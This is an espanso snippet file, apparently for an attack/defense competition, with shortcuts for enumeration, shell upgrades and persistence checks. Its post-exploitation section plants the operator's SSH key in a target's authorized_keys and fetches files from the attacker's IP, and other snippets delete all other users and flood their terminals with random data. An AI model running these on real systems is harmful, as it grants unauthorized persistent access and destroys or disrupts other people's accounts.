# espanso match file

# For a complete introduction, visit the official docs at: https://espanso.org/docs/

# You can use this file to define the base matches (aka snippets)
# that will be available in every application when using espanso.

global_vars:
  - name: "IP"
    type: "shell"
    params:
      cmd: "ip a | grep -q tun0 && hostname -I | awk '{print $(NF-0)}' || hostname -I | awk '{print $1}'"

  - name: "ssh_key"
    type: "shell"
    params:
      cmd: "cat /home/kali/.ssh/id_rsa.pub"

matches:
# QOL
  - trigger: ":ip"
    replace: "{{IP}}"

# SETUP            
  - trigger: ":setup"                  
    replace : |
      sudo apt install -y net-tools htop &
      sudo apt install ufw &

  - trigger: ":cleanusers"
    replace: for user in $(awk -F':' '{ if ($1 != "scoreuser" && $1 != "user2" && $3 >= 1000) print $1 }' /etc/passwd); do sudo userdel -r $user; done                                                                           

# DEFENSE

  - trigger: ":kill"
    replace: kill -9 

  - trigger: ":pkill"
    replace: pkill -9 -t pts/

# ENUMERATION
  - trigger: ":nmap"
    replace: sudo nmap -A -v -Pn -oN nmap --min-rate 10000 -p- 

  - trigger: ":ping"
    replace: for i in {1..254} ;do (ping -c 1 0.0.0.$i | grep "bytes from" &) ;done

# POST
  - trigger: ":pty"
    replace: |
      python3 -c 'import pty; pty.spawn("/bin/bash")' || python2 -c 'import pty; pty.spawn("/bin/bash")' || python -c 'import pty; pty.spawn("/bin/bash")' || python2.7 -c 'import pty; pty.spawn("/bin/bash")' || python3.6 -c 'import pty; pty.spawn("/bin/bash")' || python3.5 -c 'import pty; pty.spawn("/bin/bash")' || script -qc /bin/bash /dev/null 
      export TERM=screen
      stty rows 60
      stty columns 150

  - trigger: ":tty"
    replace: |
      reset
      stty raw -echo; fg
      stty rows 60 
      stty columns 150
      export TERM=screen
    
  - trigger: ":sshpersist"
    replace: |
      mkdir -p ~/.ssh
      echo "{{ssh_key}}" >> ~/.ssh/authorized_keys
      
  - trigger: ":wget"
    replace: wget http://{{IP}}/

# Persist Check

  - trigger: ":checkusers"
    replace: cat /etc/passwd | grep /*sh

  - trigger: ":suid"
    replace: find / -perm -u=s -type f 2>/dev/null

  - trigger: ":checkcron"
    replace: sudo find /etc/cron* -type f && sudo find /var/spool/cron/crontabs -type f

  - trigger: ":bashrc"
    replace: sudo find / -name '*bashrc' -exec grep -E '([0-9]{1,3}\.){3}[0-9]{1,3}|/bin/bash' {} \; -exec stat -c "%A %y %n" {} \;

# Troll

  - trigger: ":train"
    replace: sl > /dev/pts/
    
  - trigger: ":ptspam"
    replace: ctty=$(tty | cut -d/ -f4) && while :; do sleep 1; for u in $(ls /dev/pts | grep -Ev "$ctty"); do cat /dev/urandom > /dev/pts/$u & disown; done; done
